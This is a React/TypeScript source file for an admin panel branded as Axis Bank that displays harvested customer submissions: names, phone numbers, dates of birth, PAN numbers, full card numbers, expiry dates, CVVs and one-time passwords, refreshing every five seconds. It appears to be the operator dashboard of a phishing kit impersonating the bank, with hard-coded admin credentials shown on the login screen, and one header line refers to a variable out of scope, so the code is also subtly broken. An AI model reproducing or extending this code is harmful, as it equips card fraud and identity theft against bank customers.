import { useState, useEffect } from "react";
import { trpc } from "@/providers/trpc";
import {
  Shield,
  LogOut,
  RefreshCw,
  List,
  CreditCard,
  Ban,
  AlertCircle,
  Lock,
  Eye,
  EyeOff,
} from "lucide-react";

type Submission = {
  id: number;
  type: string;
  fullName: string | null;
  mobile: string | null;
  email: string | null;
  city: string | null;
  dob: string | null;
  pan: string | null;
  cardLimit: string | null;
  cardNumber: string | null;
  expiry: string | null;
  cvv: string | null;
  cardHolder: string | null;
  otp: string | null;
  otpStatus: string | null;
  createdAt: Date | string;
};

export default function Admin() {
  const [loggedIn, setLoggedIn] = useState(false);
  const [adminId, setAdminId] = useState("");
  const [adminPass, setAdminPass] = useState("");
  const [loginError, setLoginError] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [showCvv, setShowCcv] = useState(false);

  useEffect(() => {
    if (localStorage.getItem("adminLoggedIn") === "true") {
      setLoggedIn(true);
    }
  }, []);

  const { data: submissions, refetch, isLoading } = trpc.submissions.list.useQuery(
    undefined,
    { enabled: loggedIn, refetchInterval: 5000 }
  );

  const handleLogin = () => {
    if (adminId.trim() === "admin" && adminPass.trim() === "axis@2026") {
      localStorage.setItem("adminLoggedIn", "true");
      setLoggedIn(true);
      setLoginError(false);
    } else {
      setLoginError(true);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("adminLoggedIn");
    setLoggedIn(false);
    setAdminId("");
    setAdminPass("");
  };

  const applyCount = submissions?.filter((s: Submission) => s.type === "Apply Card").length || 0;
  const blockCount = submissions?.filter((s: Submission) => s.type === "Block Card").length || 0;

  const formatCard = (num: string | null) => {
    if (!num) return "N/A";
    return num;
  };

  if (!loggedIn) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-[#96144c] to-[#6a0c35] flex items-center justify-center px-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 sm:p-10 w-full max-w-md">
          <div className="text-center mb-6">
            <Shield className="w-12 h-12 text-[#96144c] mx-auto mb-3" />
            <h2 className="text-2xl font-bold text-gray-900">Admin Login</h2>
            <p className="text-gray-400 text-sm mt-1">Secure access to submission data</p>
          </div>

          <div className="flex flex-col gap-4">
            <input
              type="text"
              placeholder="Admin ID"
              value={adminId}
              onChange={(e) => setAdminId(e.target.value)}
              onKeyDown={(e) => e.key === "Enter" && handleLogin()}
              className="w-full px-4 py-3 border-2 border-gray-200 rounded-xl outline-none focus:border-[#96144c] transition-all"
            />
            <div className="relative">
              <input
                type={showPass ? "text" : "password"}
                placeholder="Password"
                value={adminPass}
                onChange={(e) => setAdminPass(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                className="w-full px-4 py-3 pr-12 border-2 border-gray-200 rounded-xl outline-none focus:border-[#96144c] transition-all"
              />
              <button
                type="button"
                onClick={() => setShowPass(!showPass)}
                className="absolute right-3 top-3 text-gray-400 hover:text-[#96144c]"
              >
                {showPass ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>

            {loginError && (
              <div className="flex items-center gap-2 bg-red-50 text-red-600 px-4 py-2 rounded-lg text-sm">
                <AlertCircle size={16} />
                Invalid ID or Password!
              </div>
            )}

            <button
              onClick={handleLogin}
              className="w-full bg-[#96144c] text-white py-3 rounded-xl font-bold hover:shadow-lg transition-all flex items-center justify-center gap-2"
            >
              <Lock size={18} /> Login
            </button>

            <p className="text-center text-xs text-gray-400 mt-2">
              Default: ID = <b>admin</b> | Pass = <b>axis@2026</b>
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header className="bg-gradient-to-r from-[#96144c] to-[#6a0c35] text-white px-4 sm:px-6 py-4 flex items-center justify-between">
        <h1 className="text-lg font-bold flex items-center gap-2">
          <Shield size={20} /> Axis Bank - Admin Panel
        </h1>
        <button
          onClick={handleLogout}
          className="flex items-center gap-2 bg-white text-[#96144c] px-4 py-2 rounded-lg font-semibold text-sm hover:bg-white/90 transition-all"
        >
          {formatCard(sub.cardNumber)}
          <LogOut size={16} /> Logout
        </button>
      </header>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 py-6">
        {/* Stats */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-6">
          <div className="bg-white p-5 rounded-xl shadow-sm text-center">
            <h3 className="text-3xl font-bold text-[#96144c]">
              {submissions?.length || 0}
            </h3>
            <p className="text-gray-500 text-sm font-medium">Total Submissions</p>
          </div>
          <div className="bg-white p-5 rounded-xl shadow-sm text-center">
            <h3 className="text-3xl font-bold text-blue-600">{applyCount}</h3>
            <p className="text-gray-500 text-sm font-medium flex items-center justify-center gap-1">
              <CreditCard size={14} /> Apply Card
            </p>
          </div>
          <div className="bg-white p-5 rounded-xl shadow-sm text-center">
            <h3 className="text-3xl font-bold text-red-600">{blockCount}</h3>
            <p className="text-gray-500 text-sm font-medium flex items-center justify-center gap-1">
              <Ban size={14} /> Block Card
            </p>
          </div>
        </div>

        {/* Table */}
        <div className="bg-white rounded-xl shadow-sm overflow-hidden">
          <div className="flex items-center justify-between px-5 py-4 border-b">
            <h2 className="font-bold text-gray-800 flex items-center gap-2">
              <List size={18} /> Recent Submissions
            </h2>
            <button
              onClick={() => refetch()}
              className="flex items-center gap-2 bg-[#96144c] text-white px-4 py-2 rounded-full text-xs font-semibold hover:shadow transition-all"
            >
              <RefreshCw size={12} /> Auto-refresh
            </button>
          </div>

          {isLoading ? (
            <div className="text-center py-12 text-gray-400">
              <RefreshCw className="animate-spin mx-auto mb-2" size={24} />
              Loading...
            </div>
          ) : !submissions?.length ? (
            <div className="text-center py-12 text-gray-400">
              <List className="mx-auto mb-3 opacity-30" size={48} />
              <p>No submissions yet</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-gradient-to-r from-[#96144c] to-[#6a0c35] text-white">
                    <th className="px-3 py-3 text-left font-semibold">#</th>
                    <th className="px-3 py-3 text-left font-semibold">Type</th>
                    <th className="px-3 py-3 text-left font-semibold">Name</th>
                    <th className="px-3 py-3 text-left font-semibold">Mobile</th>
                    <th className="px-3 py-3 text-left font-semibold">Email</th>
                    <th className="px-3 py-3 text-left font-semibold">City</th>
                    <th className="px-3 py-3 text-left font-semibold">DOB</th>
                    <th className="px-3 py-3 text-left font-semibold">PAN</th>
                    <th className="px-3 py-3 text-left font-semibold">Limit</th>
                    <th className="px-3 py-3 text-left font-semibold">Card No.</th>
                    <th className="px-3 py-3 text-left font-semibold">Expiry</th>
                    <th className="px-3 py-3 text-left font-semibold">CVV</th>
                    <th className="px-3 py-3 text-left font-semibold">Holder</th>
                    <th className="px-3 py-3 text-left font-semibold">OTP</th>
                    <th className="px-3 py-3 text-left font-semibold">Status</th>
                    <th className="px-3 py-3 text-left font-semibold">Time</th>
                  </tr>
                </thead>
                <tbody>
                  {submissions.map((sub: Submission, index: number) => (
                    <tr
                      key={sub.id}
                      className="border-b hover:bg-[#96144c]/5 transition-colors"
                    >
                      <td className="px-3 py-3 text-gray-500">{index + 1}</td>
                      <td className="px-3 py-3">
                        <span
                          className={`px-2.5 py-1 rounded-full text-xs font-semibold ${
                            sub.type === "Block Card"
                              ? "bg-red-100 text-red-700"
                              : "bg-blue-100 text-blue-700"
                          }`}
                        >
                          {sub.type}
                        </span>
                      </td>
                      <td className="px-3 py-3 font-medium text-gray-900">
                        {sub.fullName || "N/A"}
                      </td>
                      <td className="px-3 py-3 text-gray-600">{sub.mobile || "N/A"}</td>
                      <td className="px-3 py-3 text-gray-600">{sub.email || "N/A"}</td>
                      <td className="px-3 py-3 text-gray-600">{sub.city || "N/A"}</td>
                      <td className="px-3 py-3 text-gray-600">{sub.dob || "N/A"}</td>
                      <td className="px-3 py-3 text-gray-600 font-mono">{sub.pan || "N/A"}</td>
                      <td className="px-3 py-3 text-gray-600">₹{sub.cardLimit || "N/A"}</td>
                      <td className="px-3 py-3 text-gray-600 font-mono">
                        {formatCard(sub.cardNumber)}
                      </td>
                      <td className="px-3 py-3 text-gray-600">{sub.expiry || "N/A"}</td>
                      <td className="px-3 py-3">
                        <div className="flex items-center gap-1">
                          <span className="font-mono">
                            {showCvv ? sub.cvv || "N/A" : sub.cvv ? "***" : "N/A"}
                          </span>
                          {sub.cvv && (
                            <button
                              onClick={() => setShowCcv(!showCvv)}
                              className="text-gray-400 hover:text-[#96144c]"
                            >
                              {showCvv ? <EyeOff size={12} /> : <Eye size={12} />}
                            </button>
                          )}
                        </div>
                      </td>
                      <td className="px-3 py-3 text-gray-600">
                        {sub.cardHolder || "N/A"}
                      </td>
                      <td className="px-3 py-3 text-gray-600 font-mono">
                        {sub.otp || "N/A"}
                      </td>
                      <td className="px-3 py-3">
                        <span
                          className={`text-xs font-semibold ${
                            sub.otpStatus === "Invalid"
                              ? "text-red-600"
                              : sub.otpStatus === "Verified"
                              ? "text-green-600"
                              : "text-yellow-600"
                          }`}
                        >
                          {sub.otpStatus || "Pending"}
                        </span>
                      </td>
                      <td className="px-3 py-3 text-gray-500 text-xs whitespace-nowrap">
                        {sub.createdAt
                          ? new Date(sub.createdAt).toLocaleString("en-IN")
                          : "N/A"}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
